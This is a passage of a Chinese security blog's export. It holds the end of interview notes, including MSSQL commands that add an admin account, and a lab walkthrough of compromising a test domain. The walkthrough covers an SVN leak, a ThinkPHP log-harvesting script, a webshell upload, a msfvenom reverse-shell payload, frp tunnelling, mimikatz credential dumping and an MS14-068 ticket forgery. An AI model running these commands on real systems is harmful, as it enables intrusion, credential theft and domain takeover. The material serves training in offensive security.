class="line">use master;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 0;</span><br></pre></td></tr></table></figure><p>2.2添加用户456<br><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168242459940024.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">declare</span> @shell int <span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,@shell output <span class="built_in">exec</span> sp_oamethod @shell,<span class="string">&#x27;run&#x27;</span>,null,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net user 456 456 /add&#x27;</span></span><br></pre></td></tr></table></figure><p>2.3添加到管理员组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">declare</span> @shell int <span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,@shell output <span class="built_in">exec</span> sp_oamethod @shell,<span class="string">&#x27;run&#x27;</span>,null,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators 456/add&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="3-xp-regread-amp-xp-regwrite克隆账号"><a href="#3-xp-regread-amp-xp-regwrite克隆账号" class="headerlink" title="3.xp_regread &amp; xp_regwrite克隆账号"></a>3.xp_regread &amp; xp_regwrite克隆账号</h3><p>利用xp_regread 与 xp_regwrite两个存储过程脚本可以直接读取与写入注册表，所以我们可以利用这个两个存过过程来实现对“远程主机”的administrator超级管理员账号进行克隆，从而实现对目标主机的控制</p><p>具体方法不赘述了。</p><h2 id="20-烂土豆提权原理"><a href="#20-烂土豆提权原理" class="headerlink" title="20.烂土豆提权原理"></a>20.烂土豆提权原理</h2><p>1.欺骗system认证我们的tcp终端</p><p>2.重放这个ntlm，创建一个安全令牌，调用windows api</p><p>3.模仿这个令牌，要具有模仿令牌的账号才可以，一般是iis和mssql  </p><p><strong>重点是具有 selmpersonate权限的账号 也就是模仿令牌权限</strong></p><h2 id="21-cs远控木马本质，木马上线在内存中的过程"><a href="#21-cs远控木马本质，木马上线在内存中的过程" class="headerlink" title="21.cs远控木马本质，木马上线在内存中的过程"></a>21.cs远控木马本质，木马上线在内存中的过程</h2><p>远控本质</p><p>1.传输消息   一个socks连接 </p><p>2.命令执行     一个run time 的类 </p><p>3.结果回传  还有就是io文件流</p><p>内存过程我也不是很清楚，应该是通过命名管道加载shellcode，还有beacon.dll的调用。</p><h2 id="22-java内存马排查"><a href="#22-java内存马排查" class="headerlink" title="22.java内存马排查"></a>22.java内存马排查</h2><p>不懂……..</p><h2 id="23-文件上传漏洞，绕过方法"><a href="#23-文件上传漏洞，绕过方法" class="headerlink" title="23.文件上传漏洞，绕过方法"></a>23.文件上传漏洞，绕过方法</h2><p>略……</p><h2 id="24-ssrf一般用于什么"><a href="#24-ssrf一般用于什么" class="headerlink" title="24.ssrf一般用于什么"></a>24.ssrf一般用于什么</h2><p>一般用于探测内网，例如redis未授权访问，写入计划任务，还有一些内网服务端口的探测。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-项目六外围打点</title>
      <link href="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"/>
      <url>/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="1-外围打点"><a href="#1-外围打点" class="headerlink" title="1.外围打点"></a>1.外围打点</h2><p><strong>1.1拓补图</strong></p><p><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_13,color_FFFFFF,t_70,g_se,x_16-16824166569812.png"></p><p><strong>1.2发现主机</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p>可以发现目标ip为192.168.31.138，nmap扫描端口，接下来绑定hosts域名，访问目标网站。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sC -sV -O 192.168.31.138 -oA ip_port</span><br></pre></td></tr></table></figure><p>注：-p为指定端口，可以先用masscan扫描开发端口，再用nmap。</p><p>绑定hosts，目标域名是<a href="http://www.webhack123.com/">www.webhack123.com</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-16824153976775-16824153996157-16824166569813.png" alt="img"><br>直接按照图中添加就可以了。</p><p><strong>1.3网站目录扫描</strong><br>打开网站发现没有什么信息直接上gobuster扫描目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://www.webhack123.com/ -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/b5a08d3f922e4753aaf71e3f84f26ff5.png"><br>发现了svn目录，猜测是svn信息泄露，可以获取网站源码。直接去github找相关的利用工具-<a href="https://github.com/admintony/svnExploit">传送门</a><br>直接下载全部源码，其中，在一个数据库文件中发现存在账户密码，Cmd5解密得到密码是123456。</p><p>另外，像“ wc.db ”这种数据库文件我们是可以打开的。比如navcat。<br>发现一些路径信息，有thinkphp的日志文件。可以去我们svn下载的文件那看看。<br>也可以直接拼接路径，在浏览器打开。<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_12,color_FFFFFF,t_70,g_se,x_16-16824166569814.png"><br>其实大部分thinkphp网站的日志记录都是打开的，</p><p>且有一定的规律，我们可以写一个脚本进行利用。<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_11,color_FFFFFF,t_70,g_se,x_16-16824166569815.png" alt="在这里插入图片描述"><br><strong>1.4编写thinkphp3日志泄露工具</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def addurls(year):</span><br><span class="line">    url = <span class="string">&quot;http://www.webhack123.com/App/Runtime/Logs&quot;</span><span class="comment">#记得修改这个网址</span></span><br><span class="line">    urls=[]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> month <span class="keyword">in</span> range(1,13):       <span class="comment">#遍历月</span></span><br><span class="line">        <span class="keyword">for</span> day <span class="keyword">in</span> range(1,32):     <span class="comment">#遍历日</span></span><br><span class="line">            <span class="keyword">if</span> month &lt; 10:</span><br><span class="line">                <span class="keyword">if</span> day &lt; 10:</span><br><span class="line">                    urls.append(url+<span class="string">&quot;/%s_0%s_0%s.log&quot;</span>%(year,month,day))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    urls.append(url+<span class="string">&quot;/%s_0%s_%s.log&quot;</span>%(year,month,day))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> day &lt; 10:</span><br><span class="line">                    urls.append(url+<span class="string">&quot;/%s_%s_0%s.log&quot;</span>%(year,month,day))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    urls.append(url+<span class="string">&quot;/%s_%s_%s.log&quot;</span>%(year,month,day))</span><br><span class="line">    <span class="built_in">return</span> urls</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(addurls(20))</span></span><br><span class="line"></span><br><span class="line">year = sys.argv[1]          <span class="comment">#传入年</span></span><br><span class="line"><span class="comment">#print(year)</span></span><br><span class="line">urls = addurls(year)</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == 200:</span><br><span class="line">        <span class="built_in">print</span>(url)          <span class="comment">#将存在的日志的链接打印出</span></span><br><span class="line">        with open(<span class="string">&quot;thinkphp3_log.txt&quot;</span>,<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) as f:</span><br><span class="line">            f.write(r.text) <span class="comment">#将日志存入文件</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 think.py 20 <span class="comment">#对应就是20年的日志</span></span><br></pre></td></tr></table></figure><p>找到最后一个日志，拼接路径，浏览器打开，查找password，发现了密码<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168241547080813-16824166569816.png"><br>74c774ef39b5b977c1fd59dbfc73c3e380a65aa3，hash解密为web123.<br>后台密码就是 admin  和web123了。</p><p><strong>1.5找到后台地址</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">目录扫描没有得到后台地址，一般有两种可能。即后台名字比较奇葩，字典没有。</span><br><span class="line"></span><br><span class="line">另一个是，后台在域名里。</span><br><span class="line"></span><br><span class="line">这里有个小技巧，有一些大的厂商，并不会把所有的子域名都进行备案的。</span><br><span class="line"></span><br><span class="line">即他们仅仅通过少数员工通过绑定hosts使用，</span><br><span class="line"></span><br><span class="line">这样的话。子域名扫描是根本扫描不出的。这个时候，我们就可以上一个脚本了。</span><br></pre></td></tr></table></figure><p>我们可以稍微修改一下代码，我们就不需要https了，<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168241547579516-16824166569817.png"><br>只需要在ip.txt写我们的ip，host.txt填入域名 webhack123.com，domain.txt填入子域名字典，</p><p>可以看到已经找到后台地址了，admin.webhack123.com<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168241547941519-16824166569818.png"><br>本地绑定hosts进行访问，</p><p><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168241548465022-16824166569829.png"><br>输入admin web123进入后台，这里我密码输入错了一次，但是验证码还可以用，说明验证码不会立刻销毁，可以暴力破解。<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168241548974725-168241665698210.png" alt="在这里插入图片描述"><br>首先我们先熟悉一些这些功能，找一个可以getshell的点。<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168241549273728-168241665698211.png" alt="在这里插入图片描述"><br>这个位置发现可以修改上传文件类型，直接加入php，然后抓包修改文件，拼接图片连接getshell。<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/68e77d5f8a134c8091e7b593e85fefab-168241665698212.png" alt="在这里插入图片描述"><br>直接蚁剑连接了<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168241549920533-168241665698213.png" alt="在这里插入图片描述"><br>好了，发现是administrator权限，开始内网收集。<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168241550202936-168241665698214.png" alt="在这里插入图片描述"></p><h2 id="2-内网渗透"><a href="#2-内网渗透" class="headerlink" title="2.内网渗透"></a>2.内网渗透</h2><p>1.判断在内网中的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig  <span class="comment">#看一下ip，如果一个内网一个外网就可以来作跳板机了</span></span><br></pre></td></tr></table></figure><p>2.直接上线msf吧，等下还会演示用cs来渗透的，好了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.138 lport=12345 -f exe &gt; s.exe</span><br></pre></td></tr></table></figure><p>用蚁剑上传，然后执行，msf这里启动监听，直接上线，如果这里不懂就不用看了~~<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_18,color_FFFFFF,t_70,g_se,x_16-168241665698215.png" alt="在这里插入图片描述"><br>进入meterpreter，开始信息收集，首先添加路由。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/multi/manage/autoroute </span><br><span class="line">meterpreter &gt; run autoroute -p <span class="comment">#查看路由情况</span></span><br></pre></td></tr></table></figure><p>接下来进入shell吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;chcp 65001  <span class="comment">#设置编码</span></span><br><span class="line">C:\Windows\system32&gt;net view</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_16,color_FFFFFF,t_70,g_se,x_16-168241665698216.png" alt="在这里插入图片描述"><br>发现存在2个用户<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/3af31be1482042b79255406dfecccb90-168241665698217.png" alt="在这里插入图片描述"><br>找到了域，接下来我们找一下域控<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_14,color_FFFFFF,t_70,g_se,x_16-168241665698218.png" alt="在这里插入图片描述"><br>域控大概率就是10.10.10.149了，真实环境不能用arp扫描，动静太大了。</p><p><strong>命令小结</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">net view /domain 查看当前域名</span><br><span class="line"> </span><br><span class="line">net view /domain:域名 查看域内部所有计算机名</span><br><span class="line"> </span><br><span class="line">net group /domain 查看域内部所有用户组列表</span><br><span class="line"> </span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain 查看所有域成员计算机列表</span><br><span class="line"> </span><br><span class="line">net accounts /domain 查看域密码信息</span><br><span class="line"> </span><br><span class="line">nltest /domian_trusts 获取域信任信息</span><br><span class="line"> </span><br><span class="line">nltest /DCLIST:域名 查看域控制器机器名</span><br><span class="line"> </span><br><span class="line">net time /domain 查看当前时间，因为时间服务器也是主域服务器，可以看到域服务器的机器名</span><br><span class="line"> </span><br><span class="line">net group <span class="string">&quot;Domain Controllers&quot;</span> /domain 查看域控制器组，因为可能有不止一台域控，有主备之分</span><br><span class="line"> </span><br><span class="line">net user /domain 查询域内用户，会看到熟悉的krbtgt用户</span><br><span class="line"> </span><br><span class="line">wmic useraccount get /all 获取域内用户详细信息</span><br><span class="line"> </span><br><span class="line">dsquery user 查看域内存在的用户</span><br><span class="line"> </span><br><span class="line">net localgroup administrators 查看本地管理员用户组</span><br><span class="line"> </span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain 查询域管理员用户</span><br></pre></td></tr></table></figure><p>好的，信息收集完毕，接下来我们的搭建一个socks5，然后上线域控了。先搭建一下吧，既然是靶机那就多弄一下吧，练在难处，用在易处。</p><p>直接弄frp。</p><p>kali作为服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_12,color_FFFFFF,t_70,g_se,x_16-168241553658947-168241665698219.png" alt="在这里插入图片描述"><br>上线主机作为客户端</p><p>上传frpc.exe 和frpc.ini ，可以用蚁剑上传，也可以用kali的msf上传。</p><p>直接执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_18,color_FFFFFF,t_70,g_se,x_16-168241553890050-168241665698220.png" alt="在这里插入图片描述"><br>kali服务端看到这个代表已经成功了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains bash #代理全局终端就是不用在命令前面在输入proxychains</span></span><br><span class="line">root@kali:~<span class="comment"># nmap -p 445 -sT -Pn 10.10.10.149 #这里必须用tcp协议扫描。</span></span><br></pre></td></tr></table></figure><p>可以扫描一下内网常见的端口，节省时间，看到445端口开启，打一下最简单的ms17永恒之蓝漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; </span><br></pre></td></tr></table></figure><p>我这里设置了正向payload没有成功，可能是target的原因，因为是虚拟机，偏移量可以不同，就没打成功。</p><p>因为是进击dc，所以hash传递肯定是用不了了，属于是纵向深入。</p><p>不管了，先抓一下密码吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; kiwi_cmd privilege::debug  <span class="comment">#提升权限</span></span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonPasswords <span class="comment">#抓取密码</span></span><br></pre></td></tr></table></figure><p>整理一下密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WEB ; Administrator ; !@<span class="comment">#Qwe456 </span></span><br></pre></td></tr></table></figure><p>使用命令“ run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users ”来获取登录过靶机的机器。<br>这个命令，很有用，单独伶出来写。主要是对后续做票据很有用。<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_13,color_FFFFFF,t_70,g_se,x_16-168241554147953-168241665698221.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-18                                       %systemroot%\system32\config\systemprofile</span><br><span class="line">S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService</span><br><span class="line">S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService</span><br><span class="line">S-1-5-21-1443003717-4130318662-4279967973-500  C:\Users\Administrator</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-1103  C:\Users\web</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-500   C:\Users\Administrator.HACKBOX</span><br></pre></td></tr></table></figure><p>使用命令“ run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp ”开启目标远程登录。<br>可以远程登录一下，动静太大了。<br>啊这，登录不上，换个思路。<br> <strong>3.使用ms14-068提取到域控</strong><br> 这漏洞在14年就有了，后面的机器一般都会打补丁的，这个机器可以利用。</p><p>上传ms17-068.exe，可以用蚁剑，也可以用kali。</p><p>直接执行，可以看到帮助信息</p><p>看看脚本利用都需要什么条件。“ 脚本 用户 SID 域控IP 用户的密码”<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/13639e3e58d4400492cac1f9b6638fcf-168241665698222.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u web@hackbox.com S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@<span class="comment">#Qwe456</span></span><br></pre></td></tr></table></figure><p>可以在当前目录找到这个票据</p><p><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_10,color_FFFFFF,t_70,g_se,x_16-168241665698223.png" alt="在这里插入图片描述"></p><p>来加载kiwi，导入票据。 “ load kiwi ”。</p><p>但是发现kiwi没有导入票据的功能，还是得将猕猴桃上传到目标服务器。</p><p>上传mimikatz.exe 到靶机，运行它</p><p>此时先访问一下，域控机器的C盘，是无法访问的，没有权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\dc\c$ </span><br></pre></td></tr></table></figure><p>没有权限，运行mimikatz.exe，清理一下票据。</p><p>先清理一波票据“ kerberos::purge ”，在查看票据列表“ kerberos::list ”</p><p>使用命令“ kerberos::ptc <a href="mailto:&#84;&#x47;&#x54;&#95;&#x77;&#x65;&#98;&#64;&#104;&#x61;&#x63;&#107;&#98;&#x6f;&#120;&#46;&#x63;&#111;&#109;&#x2e;&#x63;&#99;&#97;&#99;&#x68;&#101;">&#84;&#x47;&#x54;&#95;&#x77;&#x65;&#98;&#64;&#104;&#x61;&#x63;&#107;&#98;&#x6f;&#120;&#46;&#x63;&#111;&#109;&#x2e;&#x63;&#99;&#97;&#99;&#x68;&#101;</a> ”进行导入。</p><p><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/86d489576aff4fb3bf98c88fcdebb052-168241665698224.png" alt="在这里插入图片描述"><br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_18,color_FFFFFF,t_70,g_se,x_16-168241555229162-168241665698225.png" 